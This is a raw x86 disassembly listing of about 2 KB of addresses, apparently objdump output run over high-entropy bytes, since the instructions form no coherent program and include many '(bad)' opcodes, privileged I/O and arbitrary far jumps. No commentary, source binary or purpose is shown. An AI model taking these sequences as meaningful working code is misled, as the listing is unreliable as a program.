  411fe4:	mov    al,ds:0xb15f4d76
  411fe9:	jg     0x411f98
  411feb:	ja     0x412022
  411fed:	jae    0x411fdd
  411fef:	pop    ss
  411ff0:	lock int 0xee
  411ff3:	push   ebp
  411ff4:	cmp    al,0x8c
  411ff6:	xchg   BYTE PTR ds:0x5b276136,dl
  411ffc:	push   edi
  411ffd:	inc    ebp
  411ffe:	inc    esp
  411fff:	popa   
  412000:	and    BYTE PTR [edx],dl
  412002:	mov    esi,0xeb2c245d
  412007:	cmp    eax,edi
  412009:	repnz fwait
  41200b:	in     al,dx
  41200c:	or     BYTE PTR [edx+0x7093bab1],ch
  412012:	jmp    0xc88f:0xc90a48eb
  412019:	sbb    DWORD PTR [edi+0x3],eax
  41201c:	add    eax,0xbcedbf74
  412021:	dec    ebp
  412022:	jnp    0x411faa
  412024:	aaa    
  412025:	xor    DWORD PTR [edi+0x76],ebx
  412028:	pop    edx
  412029:	cmp    al,0x77
  41202b:	ins    DWORD PTR es:[edi],dx
  41202c:	in     al,0xbe
  41202e:	clc    
  41202f:	sbb    eax,0x560ed011
  412034:	adc    al,0x2f
  412036:	xchg   ecx,eax
  412037:	xabort 0x58
  41203a:	fs xchg edi,eax
  41203c:	xchg   edx,eax
  41203d:	aam    0xb5
  41203f:	xor    edi,edi
  412041:	fnstcw WORD PTR [ebx+0x40ff2faa]
  412047:	jle    0x4120a9
  412049:	xchg   esp,eax
  41204a:	rol    DWORD PTR [ecx-0x4b],0xf3
  41204e:	popa   
  41204f:	fcomip st,st(2)
  412051:	pop    esi
  412052:	add    dh,BYTE PTR ss:[edi]
  412055:	hlt    
  412056:	adc    eax,0x5474b34a
  41205b:	loop   0x411fe2
  41205d:	or     DWORD PTR [edx+0x3f1f3f77],0x794f6c70
  412067:	daa    
  412068:	jb     0x4120df
  41206a:	mov    esi,0xe37366d2
  41206f:	iret   
  412070:	mov    DWORD PTR [ecx+0x34ad5038],ebx
  412076:	sbb    esp,DWORD PTR [eax-0x6f72d3f]
  41207c:	out    dx,al
  41207d:	sub    esi,DWORD PTR fs:[ebp-0x6a11a555]
  412084:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  412086:	ins    DWORD PTR es:[edi],dx
  412087:	mov    ds:0x94927018,eax
  41208c:	push   0x21
  41208e:	xor    edx,DWORD PTR [esi-0x2d8324d6]
  412094:	mov    esi,0x145791c7
  412099:	or     dl,bh
  41209b:	dec    ebx
  41209c:	out    0x2b,al
  41209e:	adc    DWORD PTR [ecx+0x71],ebp
  4120a1:	cwde   
  4120a2:	pusha  
  4120a3:	popf   
  4120a4:	mov    esp,DWORD PTR [eax+0x7bc8a598]
  4120aa:	inc    edx
  4120ab:	cmp    esp,DWORD PTR [edi+0x78bcef82]
  4120b1:	and    edi,edi
  4120b3:	mov    dl,BYTE PTR [edx-0x1d]
  4120b6:	fcomp  DWORD PTR [ecx+0x29b78610]
  4120bc:	sahf   
  4120bd:	scas   eax,DWORD PTR es:[edi]
  4120be:	sbb    ebx,ecx
  4120c0:	je     0x412073
  4120c2:	xor    WORD PTR [edi],0x1d04
  4120c7:	push   cs
  4120c8:	fstp   QWORD PTR [edx-0x3f]
  4120cb:	stos   DWORD PTR es:[edi],eax
  4120cc:	call   0xc7cb:0x74b092bf
  4120d3:	hlt    
  4120d4:	add    DWORD PTR [esi],eax
  4120d6:	or     DWORD PTR [ebp-0x2c],edi
  4120d9:	inc    ebp
  4120da:	and    DWORD PTR [ebx],esi
  4120dc:	adc    ecx,esi
  4120de:	sub    DWORD PTR [ebx-0x20039e44],edi
  4120e4:	std    
  4120e5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4120e6:	rcr    cl,1
  4120e8:	inc    edi
  4120e9:	sub    al,0xe1
  4120eb:	js     0x412153
  4120ed:	stc    
  4120ee:	push   esp
  4120ef:	xchg   ecx,eax
  4120f0:	nop
  4120f1:	mov    ds:0xf84f20cf,eax
  4120f6:	and    al,0x65
  4120f8:	dec    ebp
  4120f9:	sbb    ecx,DWORD PTR [edi]
  4120fb:	add    ch,BYTE PTR [esi-0x4e]
  4120fe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4120ff:	retf   0x2d7d
  412102:	lea    ecx,[ecx-0x45744276]
  412108:	xchg   esi,eax
  412109:	jmp    0x4120b8
  41210b:	push   ebx
  41210c:	dec    ebp
  41210d:	xor    al,0x3b
  41210f:	popf   
  412110:	jecxz  0x412139
  412112:	repnz test eax,0x16130fdb
  412118:	ja     0x41218e
  41211a:	or     eax,0x7429e43c
  41211f:	inc    esi
  412120:	das    
  412121:	push   edx
  412122:	imul   ecx,DWORD PTR [edi+edx*4+0x60],0xe9d5d7ac
  41212a:	imul   ebx,DWORD PTR ds:0x6d600a2f,0xffffff91
  412131:	push   ecx
  412132:	(bad)  
  412133:	imul   esi,DWORD PTR [edx+0x128f86fd],0xd44793c8
  41213d:	inc    edi
  41213e:	lods   al,BYTE PTR ds:[esi]
  41213f:	int    0xe7
  412141:	jp     0x4121c2
  412143:	adc    al,0x8a
  412145:	cmp    DWORD PTR ds:0x7e7195dd,edx
  41214b:	leave  
  41214c:	dec    edx
  41214d:	pushw  ds
  41214f:	add    eax,0x903b7f5d
  412154:	xchg   esp,eax
  412155:	arpl   cx,si
  412157:	fsubp  st(2),st
  412159:	mov    cl,0xde
  41215b:	pop    esi
  41215c:	hlt    
  41215d:	fadd   DWORD PTR [esi-0x2ef0b72d]
  412163:	mov    eax,ds:0x566e9788
  412168:	repnz inc ecx
  41216a:	xor    edx,DWORD PTR [ecx+0x68]
  41216d:	rcr    edx,1
  41216f:	inc    esp
  412170:	ss int 0x73
  412173:	repz pop es
  412175:	sbb    DWORD PTR [edi+ecx*1],ebp
  412178:	pop    eax
  412179:	xchg   ebx,eax
  41217a:	push   ds
  41217b:	jg     0x412171
  41217d:	(bad)  
  41217e:	scas   al,BYTE PTR es:[edi]
  41217f:	inc    esp
  412180:	inc    esp
  412181:	leave  
  412182:	mov    bl,0x77
  412184:	mov    esp,0x59adf30
  412189:	ins    BYTE PTR es:[edi],dx
  41218a:	mov    eax,0x5a99f084
  41218f:	push   0x21
  412191:	lahf   
  412192:	stc    
  412193:	mov    dl,0x38
  412195:	dec    edi
  412196:	imul   edi,DWORD PTR [edi+0x47],0xef7363fd
  41219d:	xor    eax,DWORD PTR [edi-0x1ee968c7]
  4121a3:	(bad)  
  4121a4:	not    DWORD PTR [ecx-0x40d08fe9]
  4121aa:	icebp  
  4121ab:	mov    WORD PTR [ebx+0x13],fs
  4121ae:	sbb    eax,0xb1a68e91
  4121b3:	adc    DWORD PTR [ebx],ebx
  4121b5:	stos   DWORD PTR es:[edi],eax
  4121b6:	(bad)  
  4121b7:	xor    DWORD PTR [edx-0x78],edi
  4121ba:	std    
  4121bb:	fsub   st(4),st
  4121bd:	jno    0x412186
  4121bf:	outs   dx,DWORD PTR ds:[esi]
  4121c0:	mov    ebx,0x2321e617
  4121c5:	inc    edi
  4121c6:	xchg   esi,eax
  4121c7:	scas   al,BYTE PTR es:[edi]
  4121c8:	xchg   esp,eax
  4121c9:	lea    eax,[ecx+0x13366855]
  4121cf:	call   0x2c80044
  4121d4:	xchg   ebp,eax
  4121d5:	in     eax,dx
  4121d6:	out    0x6e,al
  4121d8:	jbe    0x41215a
  4121da:	jnp    0x412192
  4121dc:	adc    DWORD PTR [edx],edi
  4121de:	stos   BYTE PTR es:[edi],al
  4121df:	sbb    ecx,DWORD PTR ds:0x3fb1e467
  4121e5:	pop    ds
  4121e6:	dec    ebp
  4121e7:	add    dh,cl
  4121e9:	inc    eax
  4121ea:	lahf   
  4121eb:	clc    
  4121ec:	jnp    0x41224f
  4121ee:	mov    ebx,DWORD PTR [edx-0x49bdbe46]
  4121f4:	add    cl,BYTE PTR [eax]
  4121f6:	xor    al,0x2d
  4121f8:	fdivr  st,st(0)
  4121fa:	adc    al,0xf4
  4121fc:	(bad)  
  4121fd:	or     eax,0x87c82d15
  412202:	sub    DWORD PTR [ecx+0x4],eax
  412205:	mov    ch,0xa6
  412207:	imul   ecx,DWORD PTR [edx+eiz*8-0x7d2aa3bf],0x53bf6f73
  412212:	sub    DWORD PTR [esi],esi
  412214:	(bad)  
  412215:	stc    
  412216:	inc    ebp
  412217:	cs stos DWORD PTR es:[edi],eax
  412219:	rol    DWORD PTR [edi-0x58],0x9c
  41221d:	loopne 0x41223c
  41221f:	xchg   edi,eax
  412220:	loopne 0x412237
  412222:	shl    BYTE PTR [edx+0x0],1
  412225:	test   bh,ah
  412227:	and    al,0xa
  412229:	sbb    al,0x94
  41222b:	les    ecx,FWORD PTR [esi+eax*1-0x3018657d]
  412232:	repnz push esi
  412234:	mov    esp,0x7df52e57
  412239:	fcom   st(1)
  41223b:	adc    DWORD PTR [ebx+ebp*4-0xe59b676],ebx
  412242:	addr16 inc esi
  412244:	cmp    BYTE PTR [esi-0x65],dh
  412247:	cdq    
  412248:	dec    edx
  412249:	imul   BYTE PTR [ecx-0x663e52b8]
  41224f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412250:	xchg   edi,eax
  412251:	nop
  412252:	xchg   edx,eax
  412253:	mov    ah,0x2c
  412255:	adc    al,0x35
  412257:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412259:	add    BYTE PTR [edi-0x115e465a],ch
  41225f:	(bad)  ds:0xd003ef96
  412265:	dec    edx
  412266:	iret   
  412267:	push   eax
  412268:	xchg   DWORD PTR [ebx-0xb01e201],ebx
  41226e:	dec    eax
  41226f:	int    0xfd
  412271:	xor    al,0x62
  412273:	mov    edi,0xf30f60c7
  412278:	sub    al,0xe2
  41227a:	push   es
  41227b:	es or  ch,al
  41227e:	hlt    
  41227f:	(bad)  
  412280:	and    ah,BYTE PTR [ebx-0x1a]
  412283:	int    0x94
  412285:	mov    DWORD PTR [ebx],edi
  412287:	push   eax
  412288:	xchg   ah,ch
  41228a:	adc    eax,edx
  41228c:	(bad)  
  41228e:	pop    esi
  41228f:	jns    0x4122f8
  412291:	icebp  
  412292:	inc    esp
  412293:	sub    esp,DWORD PTR [ecx+edx*2-0x52ad54e9]
  41229a:	mov    bl,0xa5
  41229c:	sti    
  41229d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41229e:	ret    
  41229f:	inc    ecx
  4122a0:	mov    al,ds:0xd51a7830
  4122a5:	adc    al,0xf2
  4122a7:	outs   dx,BYTE PTR ds:[esi]
  4122a8:	in     eax,0x41
  4122aa:	jle    0x412253
  4122ac:	(bad)  
  4122ae:	mov    WORD PTR fs:[ebp+0x44148506],?
  4122b5:	fwait
  4122b6:	mov    dl,0x15
  4122b8:	dec    ecx
  4122b9:	lds    ecx,FWORD PTR ds:0x441d0ce6
  4122bf:	int3   
  4122c0:	(bad)  
  4122c1:	adc    eax,0x93776387
  4122c6:	cmp    edi,DWORD PTR [edx-0x4c]
  4122c9:	imul   edi,DWORD PTR [ebp-0x16],0x22
  4122cd:	stos   DWORD PTR es:[edi],eax
  4122ce:	add    BYTE PTR [ebp-0x36],al
  4122d1:	dec    ebx
  4122d2:	push   ebx
  4122d3:	in     eax,dx
  4122d4:	not    BYTE PTR [edi+0x67]
  4122d7:	retf   0x191
  4122da:	outs   dx,DWORD PTR ds:[esi]
  4122db:	adc    ebx,DWORD PTR [ecx-0x39e6a40e]
  4122e1:	mov    ch,0x48
  4122e3:	push   0xffffffc0
  4122e5:	lahf   
  4122e6:	enter  0x50ea,0x27
  4122ea:	inc    ebx
  4122eb:	or     al,dl
  4122ed:	call   0x8f9e6809
  4122f2:	mov    dh,0x98
  4122f4:	iret   
  4122f5:	push   0x62557f4c
  4122fa:	adc    dh,ah
  4122fc:	fwait
  4122fd:	shl    DWORD PTR [esi+0x1b1de151],cl
  412303:	adc    ecx,esp
  412305:	mov    DWORD PTR [ebp+0x5651471b],esi
  41230b:	add    cl,bl
  41230d:	pop    esi
  41230e:	xchg   edi,eax
  41230f:	jecxz  0x4122d9
  412311:	ss fwait
  412313:	lods   eax,DWORD PTR ds:[esi]
  412314:	and    al,0x98
  412316:	adc    BYTE PTR [ecx+0x6e],bl
  412319:	cmp    edx,DWORD PTR [edi-0x66c22f1f]
  41231f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412320:	xor    al,0x60
  412322:	rcr    edx,0xa0
  412325:	je     0x412380
  412327:	pop    edi
  412328:	(bad)  
  412329:	loopne 0x41235e
  41232b:	ds push esp
  41232d:	pop    ebp
  41232e:	sbb    esp,DWORD PTR [ebx-0x47]
  412331:	not    BYTE PTR [ebp+esi*4+0x29]
  412335:	mov    bh,BYTE PTR [eax]
  412337:	es daa 
  412339:	push   ebp
  41233a:	jo     0x412374
  41233c:	push   ds
  41233d:	pop    ecx
  41233e:	(bad)  
  41233f:	xor    eax,0xa1c079bd
  412344:	pop    ebx
  412345:	fisubr WORD PTR [edx]
  412347:	in     al,dx
  412348:	repnz xor eax,0x4865beb8
  41234e:	js     0x4123c5
  412350:	frstor [edx-0x17]
  412353:	mov    eax,?
  412355:	jae    0x41238f
  412357:	mov    ch,0xa3
  412359:	test   BYTE PTR [ecx-0x1270a4c],bl
  41235f:	call   0x5f5b:0x85359bb3
  412366:	cmp    edx,esi
  412368:	jg     0x412313
  41236a:	xor    al,0x12
  41236d:	dec    edx
  41236e:	rcl    BYTE PTR [edx+0x34],0x49
  412372:	mov    ecx,0x1c5f94ed
  412377:	add    eax,0xc8ed57e5
  41237c:	cmp    al,0x85
  41237e:	mov    bl,0x17
  412380:	fs lahf 
  412382:	mov    cs,WORD PTR [eax+0x95960ff]
  412388:	fucomi st,st(4)
  41238a:	jmp    0x2daf:0xb635f72d
  412391:	ins    BYTE PTR es:[edi],dx
  412392:	jg     0x412407
  412394:	lds    esi,FWORD PTR [edx-0x2a]
  412397:	test   eax,0xc605a8e9
  41239c:	add    DWORD PTR es:[edi+0x54f0edf],esp
  4123a3:	call   0x5999:0x736f060e
  4123aa:	mov    edx,0x27d273f0
  4123af:	adc    al,ch
  4123b1:	push   ss
  4123b2:	std    
  4123b3:	cmp    DWORD PTR [ebx],edi
  4123b5:	xor    al,0xd2
  4123b7:	add    bl,BYTE PTR [edx]
  4123b9:	popa   
  4123ba:	inc    ecx
  4123bb:	ret    
  4123bc:	in     al,0x6d
  4123be:	and    eax,0xbcd540c0
  4123c3:	xchg   bl,bl
  4123c5:	(bad)  
  4123c6:	pop    ds
  4123c7:	sub    al,0xb5
  4123c9:	(bad)  
  4123ca:	in     eax,0xd9
  4123cc:	pop    ecx
  4123cd:	nop
  4123ce:	xlat   BYTE PTR ds:[ebx]
  4123cf:	xchg   ebp,eax
  4123d0:	sar    BYTE PTR [eax],cl
  4123d2:	fdivr  QWORD PTR [esi+0x7615b87b]
  4123d8:	ret    0xa240
  4123db:	add    al,0x3d
  4123dd:	jmp    0x294c:0x21fc33a0
  4123e4:	adc    eax,0x3d3943a8
  4123e9:	mov    bl,bl
  4123eb:	and    DWORD PTR [ebx+0x13],esp
  4123ee:	pop    edx
  4123ef:	jp     0x4123f2
  4123f1:	div    DWORD PTR [edx-0x6f44e5c8]
  4123f7:	pop    esp
  4123f8:	jp     0x41244d
  4123fa:	cli    
  4123fb:	adc    BYTE PTR [ebx+0x67],al
  4123fe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4123ff:	or     BYTE PTR [ecx-0x1f941657],0x81
  412406:	mov    edi,0xaaaf40ce
  41240b:	ja     0x4123e6
  41240d:	test   eax,0xc7edcd94
  412412:	les    esi,FWORD PTR [ecx-0x46]
  412415:	scas   al,BYTE PTR es:[edi]
  412416:	or     DWORD PTR [eax-0x40f02786],0x5b
  41241d:	les    edx,FWORD PTR [ecx]
  41241f:	repnz adc BYTE PTR [ebx-0x72d90ccc],ch
  412426:	push   eax
  412427:	rcr    BYTE PTR [ecx],1
  412429:	daa    
  41242a:	aaa    
  41242b:	cmp    cl,0xf0
  41242e:	idiv   bl
  412430:	test   al,0x91
  412432:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412433:	mov    dl,bh
  412435:	or     al,0x43
  412437:	call   0xf58dc746
  41243c:	add    esp,DWORD PTR [eax]
  41243e:	ja     0x4123c6
  412440:	fsub   QWORD PTR [ebp+0x5a]
  412443:	sti    
  412444:	dec    eax
  412445:	pslld  mm2,QWORD PTR [edi-0x610c5362]
  41244c:	pop    esi
  41244d:	adc    ah,ah
  41244f:	ds push edi
  412451:	nop
  412452:	cmp    eax,0x55d80340
  412457:	enter  0x58b3,0xb7
  41245b:	jl     0x4124ab
  41245d:	lods   al,BYTE PTR ds:[esi]
  41245e:	fsubr  DWORD PTR [ecx+edi*4+0xa]
  412462:	adc    esp,edx
  412464:	repz ror BYTE PTR [esi-0x37],0xe2
  412469:	ins    DWORD PTR es:[edi],dx
  41246a:	dec    ebx
  41246b:	xchg   esp,eax
  41246c:	fs int 0xb2
  41246f:	mov    DWORD PTR [edi],0xac5ba03
  412475:	scas   eax,DWORD PTR es:[edi]
  412476:	out    dx,eax
  412477:	sub    DWORD PTR [eax],ebp
  412479:	sar    BYTE PTR [eax-0x546f999e],cl
  41247f:	jb     0x412471
  412481:	lods   eax,DWORD PTR ds:[esi]
  412482:	push   esi
  412483:	cdq    
  412484:	cmp    al,0xde
  412486:	push   ss
  412487:	ss repnz int 0x62
  41248b:	cmp    al,0x56
  41248d:	hlt    
  41248e:	xchg   esp,eax
  41248f:	imul   BYTE PTR [ecx-0x6e]
  412492:	xchg   DWORD PTR [eax+0x26],esp
  412495:	lea    ebp,[ebp-0x2c]
  412498:	sub    DWORD PTR [ebp-0x7e60c407],edx
  41249e:	sbb    ebx,DWORD PTR [esi-0x7be81333]
  4124a4:	and    DWORD PTR [edi-0x5d1e5188],esi
  4124aa:	dec    ebx
  4124ab:	(bad)  
  4124ac:	jp     0x4124e1
  4124ae:	into   
  4124af:	push   esi
  4124b0:	xchg   esi,eax
  4124b1:	ror    DWORD PTR [eax],1
  4124b3:	repnz fidiv DWORD PTR [esp+ecx*8-0x55c14414]
  4124bb:	inc    ebx
  4124bc:	ret    
  4124bd:	mov    edx,0x919df374
  4124c2:	enter  0x3ec3,0x65
  4124c6:	jmp    0x41251a
  4124c8:	push   0x69
  4124ca:	sbb    cl,BYTE PTR [ecx+0x76e6f990]
  4124d0:	sub    BYTE PTR [edx-0x13],0x88
  4124d4:	setp   BYTE PTR [eax]
  4124d7:	xchg   DWORD PTR [ecx-0x70],edi
  4124da:	mov    edx,0x61d740ed
  4124df:	push   esi
  4124e0:	in     eax,dx
  4124e1:	test   eax,0x39ee2060
  4124e6:	enter  0xe1ca,0x7e
  4124ea:	cld    
  4124eb:	ins    BYTE PTR es:[edi],dx
  4124ec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4124ed:	or     esi,DWORD PTR [esi]
  4124ef:	cmp    BYTE PTR [ebp*1-0x24b917f9],dh
  4124f6:	(bad)  
  4124f8:	mov    eax,0x5dc0b796
  4124fd:	jp     0x412548
  4124ff:	pop    eax
  412500:	sub    eax,0x9c80ff8d
  412505:	out    dx,al
  412506:	cmp    esp,ebx
  412508:	xchg   esi,eax
  412509:	push   ebp
  41250a:	scas   al,BYTE PTR es:[edi]
  41250b:	retf   
  41250c:	jne    0x41250f
  41250e:	xor    eax,0xca5375db
  412513:	pop    ds
  412514:	mov    esi,DWORD PTR [esi-0x3a7a90ea]
  41251a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41251b:	jl     0x412505
  41251d:	sub    edi,DWORD PTR [eax+edi*8-0x68c5f8ce]
  412524:	or     eax,DWORD PTR [ebx+0x69ce2315]
  41252a:	or     BYTE PTR [ebx],cl
  41252c:	and    edi,ebp
  41252e:	lock and DWORD PTR [eax-0x18f82a52],esi
  412535:	pop    ss
  412536:	test   al,0xa
  412538:	mov    ds:0x9ec3a6de,ax
  41253e:	lods   al,BYTE PTR ds:[esi]
  41253f:	push   edi
  412540:	not    DWORD PTR [edx]
  412542:	pop    edi
  412543:	ins    BYTE PTR es:[edi],dx
  412544:	(bad)  
  412545:	jl     0x412592
  412547:	sub    BYTE PTR [edx+eax*8-0x4ce9fd9f],ah
  41254e:	pop    eax
  41254f:	gs xchg edi,eax
  412551:	bound  ebp,QWORD PTR [edi]
  412553:	jmp    0x4125ba
  412555:	and    dh,BYTE PTR [esi+eax*2]
  412558:	(bad)  
  412559:	gs cs out 0x3d,eax
  41255d:	mov    DWORD PTR [edx+0x24],ebx
  412560:	or     al,0xf1
  412562:	leave  
  412563:	sti    
  412564:	pop    edi
  412565:	(bad)  
  412566:	pop    ecx
  412567:	(bad)  
  412568:	or     BYTE PTR [eax+ebx*4-0x7d],ch
  41256c:	mov    ebp,0x5d67bb90
  412571:	cmc    
  412572:	data16 mov al,BYTE PTR [eax-0x48]
  412576:	adc    DWORD PTR [ecx+0x11],ebx
  412579:	(bad)  
  41257a:	mov    dh,0xfb
  41257c:	push   es
  41257d:	retf   0x96d3
  412580:	enterw 0xacef,0xc5
  412585:	rol    DWORD PTR [ecx-0x61],0xd6
  412589:	inc    ebp
  41258a:	mov    eax,0xb9a97e8e
  41258f:	cmp    al,0x15
  412591:	jp     0x412566
  412593:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412594:	es push ss
  412596:	dec    edx
  412597:	mov    cl,0x2
  412599:	cwde   
  41259a:	jmp    0x9999:0x4716c976
  4125a1:	mov    bl,0x8b
  4125a3:	jg     0x4125e8
  4125a5:	jmp    0x4125d1
  4125a7:	je     0x4125f9
  4125a9:	ret    0xf4cb
  4125ac:	mov    ds:0x1e70be2d,al
  4125b1:	add    ah,BYTE PTR [ecx-0x384ab274]
  4125b7:	je     0x412630
  4125b9:	pop    ss
  4125ba:	mov    ecx,0x46a6bcc5
  4125bf:	jg     0x41257d
  4125c1:	push   ds
  4125c2:	(bad)  
  4125c3:	jmp    0xf52f8eb3
  4125c8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4125c9:	jecxz  0x412600
  4125cb:	xor    dh,BYTE PTR [ecx-0x49]
  4125ce:	push   es
  4125cf:	pop    edi
  4125d0:	arpl   WORD PTR [ecx-0x4d029e42],ax
  4125d6:	fcmove st,st(0)
  4125d8:	push   0x6c
  4125da:	xor    al,0xce
  4125dc:	sub    eax,0x5621cc76
  4125e1:	ret    
  4125e2:	push   eax
  4125e3:	repz mov al,ds:0x4349488c
  4125e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4125ea:	in     al,0xe0
  4125ec:	ins    DWORD PTR es:[edi],dx
  4125ed:	push   dx
  4125ef:	mov    ecx,0x346cd252
  4125f4:	jbe    0x41259b
  4125f6:	push   cs
  4125f7:	popf   
  4125f8:	xchg   esp,eax
  4125f9:	cmc    
  4125fa:	(bad)  
  4125fc:	add    eax,0x9b0ebda0
  412601:	stos   DWORD PTR es:[edi],eax
  412602:	mov    cl,0x30
  412604:	shr    DWORD PTR [esp+ecx*1-0x50416c45],1
  41260b:	test   BYTE PTR [esi],dh
  41260d:	xchg   esp,eax
  41260e:	cmp    dh,ch
  412610:	inc    esp
  412611:	lahf   
  412612:	sub    ebx,DWORD PTR [ebp+0x77]
  412615:	xor    eax,0x998a58c7
  41261a:	setae  BYTE PTR [eax-0x50aeafcf]
  412621:	call   0x3d5a:0x4d051842
  412628:	lahf   
  412629:	dec    esp
  41262a:	ins    BYTE PTR es:[edi],dx
  41262b:	mov    eax,0xe9f0f857
  412630:	add    DWORD PTR ds:0xc15e51de,esp
  412636:	mov    esp,0x2812ec79
  41263b:	imul   ebx,DWORD PTR [esi-0x7c0d4360],0xf3792800
  412645:	ja     0x412602
  412647:	out    dx,al
  412648:	xor    esi,DWORD PTR [ebx+ebx*8]
  41264b:	jne    0x412688
  41264d:	sar    DWORD PTR [ecx],0x6a
  412650:	idiv   BYTE PTR [ecx-0x6af06475]
  412656:	inc    esi
  412657:	lds    ebx,FWORD PTR [esi]
  412659:	xor    DWORD PTR [ebp+0x64bc0e15],esi
  41265f:	lds    edi,FWORD PTR [ecx+0x63]
  412662:	shl    BYTE PTR [edx],0xfa
  412665:	xchg   ecx,eax
  412666:	and    BYTE PTR [eax+edx*2+0x27379794],bl
  41266d:	push   ecx
  41266e:	test   al,0x39
  412670:	sahf   
  412671:	mov    es,edi
  412673:	call   0x1245974
  412678:	fist   DWORD PTR [edi-0x1b]
  41267b:	fldcw  WORD PTR [esi]
  41267d:	adc    DWORD PTR [esi-0x5dcc03f3],ebp
  412683:	dec    ebx
  412684:	jnp    0x4126d2
  412686:	mov    edx,0xb0e132da
  41268b:	xor    edx,esi
  41268d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41268e:	xchg   esp,eax
  41268f:	ss stos DWORD PTR es:[edi],eax
  412691:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412692:	pop    esi
  412693:	scas   al,BYTE PTR es:[edi]
  412694:	cdq    
  412695:	cmp    eax,0x3c9e0fcb
  41269a:	ret    0x1b3c
  41269d:	shl    DWORD PTR [eax-0x34],0x1a
  4126a1:	mov    eax,0x7a99ade8
  4126a6:	jmp    0xbf703bf5
  4126ab:	cdq    
  4126ac:	xor    ah,ch
  4126ae:	sub    BYTE PTR [eax],ah
  4126b0:	ret    
  4126b1:	icebp  
  4126b2:	(bad)  [ebx+0x4f]
  4126b5:	sbb    esi,DWORD PTR [edx]
  4126b7:	mov    ebx,0x5ab8c7da
  4126bc:	jnp    0x4126a6
  4126be:	cs mov bh,0xd6
  4126c1:	xchg   ebx,eax
  4126c2:	fisub  WORD PTR [edx+0x20035f69]
  4126c8:	icebp  
  4126c9:	gs and al,0xc9
  4126cc:	test   BYTE PTR [eax],ch
  4126ce:	xor    cl,BYTE PTR [edi-0x2cdcef44]
  4126d4:	jge    0x4126a0
  4126d6:	jns    0x4126a3
  4126d8:	jge    0x412718
  4126da:	fistp  WORD PTR ds:0xa5348b15
  4126e0:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  4126e2:	xor    DWORD PTR [esi+0x6f],ebp
  4126e5:	jmp    0xef061f41
  4126ea:	icebp  
  4126eb:	dec    esp
  4126ec:	js     0x41271c
  4126ee:	push   eax
  4126ef:	ins    DWORD PTR es:[edi],dx
  4126f0:	jae    0x412744
  4126f2:	(bad)  
  4126f4:	outs   dx,DWORD PTR ds:[esi]
  4126f5:	pop    ebp
  4126f6:	ret    
  4126f7:	hlt    
  4126f8:	cmp    eax,0x1df3c768
  4126fd:	xor    BYTE PTR [ecx+0x6e800cd6],al
  412703:	sahf   
  412704:	test   DWORD PTR [edx+0x2c],esi
  412707:	lods   eax,DWORD PTR ds:[esi]
  412708:	fucomi st,st(3)
  41270a:	call   0xb6d4d6ea
  41270f:	mov    ecx,0x7582d7cb
  412714:	add    al,0x38
  412716:	dec    edi
  412717:	xor    eax,0xe6f20806
  41271c:	(bad)  
  41271d:	mov    ecx,0xd8335208
  412722:	stos   BYTE PTR es:[edi],al
  412723:	or     eax,0xb16c4d29
  412728:	xchg   DWORD PTR [eax+0x68],ebp
  41272b:	cmc    
  41272c:	and    al,0x4c
  41272e:	add    ebp,DWORD PTR [esi+edi*8]
  412731:	clc    
  412732:	cmp    al,0x65
  412734:	push   esi
  412735:	xchg   eax,ebx
  412737:	(bad)  
  412738:	(bad)  
  412739:	jl     0x4126bc
  41273b:	aaa    
  41273c:	test   DWORD PTR [edi+0x6ad3f40d],esi
  412742:	loop   0x41271e
  412744:	pop    ebp
  412745:	or     DWORD PTR [edi],ebp
  412747:	int    0xfe
  412749:	mov    WORD PTR [ebp+0x4365404d],gs
  41274f:	push   esi
  412750:	and    ecx,DWORD PTR [edi]
  412752:	xor    ebp,DWORD PTR [esi-0x24c9af37]
  412758:	sbb    ebx,ecx
  41275a:	adc    eax,0x432bfc69
  41275f:	fcom   QWORD PTR [bx+di-0x1f]
  412763:	push   ss
  412764:	test   ebp,edx
  412766:	pop    ebx
  412767:	repz pop ecx
  412769:	inc    ecx
  41276a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41276b:	idiv   DWORD PTR ss:0x394e9887
  412772:	inc    esi
  412773:	cli    
  412774:	inc    edi
  412775:	xchg   edi,eax
  412776:	inc    edx
  412777:	pop    ds
  412778:	test   DWORD PTR [edi+0x41],ecx
  41277b:	xor    ebp,edi
  41277d:	jp     0x41279c
  41277f:	xor    DWORD PTR [edi],0x21b91d26
  412785:	loope  0x412798
  412787:	jmp    0x7285:0x9bf8271c
  41278e:	pop    eax
  41278f:	clc    
  412790:	push   esi
  412791:	xchg   edi,eax
  412792:	adc    bh,dh
  412794:	sbb    BYTE PTR [edx],0x37
  412797:	push   ebp
  412798:	or     BYTE PTR [esi-0x7d],ch
  41279b:	fidivr WORD PTR [edx]
  41279d:	shr    dh,1
  41279f:	jae    0x4127e5
  4127a1:	xor    BYTE PTR [eax-0x2a],bh
  4127a4:	sub    edi,DWORD PTR [ecx]
  4127a6:	xchg   ebp,eax
  4127a7:	inc    esi
  4127a8:	mov    esp,0x598c9c41
  4127ad:	outs   dx,DWORD PTR ds:[esi]
  4127ae:	jns    0x41279f
  4127b0:	int    0xe4
  4127b2:	daa    
  4127b3:	neg    DWORD PTR [ecx+0xd]
  4127b6:	pop    edi
  4127b7:	lods   eax,DWORD PTR ds:[esi]
  4127b8:	or     edi,DWORD PTR [esi+0x512e4570]
  4127be:	pop    eax
  4127bf:	popf   
  4127c0:	push   es
  4127c1:	loop   0x4127ce
  4127c3:	jmp    0xba27:0xf25380b2
  4127ca:	fdiv   QWORD PTR [eax+0x1c20fe08]
  4127d0:	xchg   DWORD PTR [ecx],esi
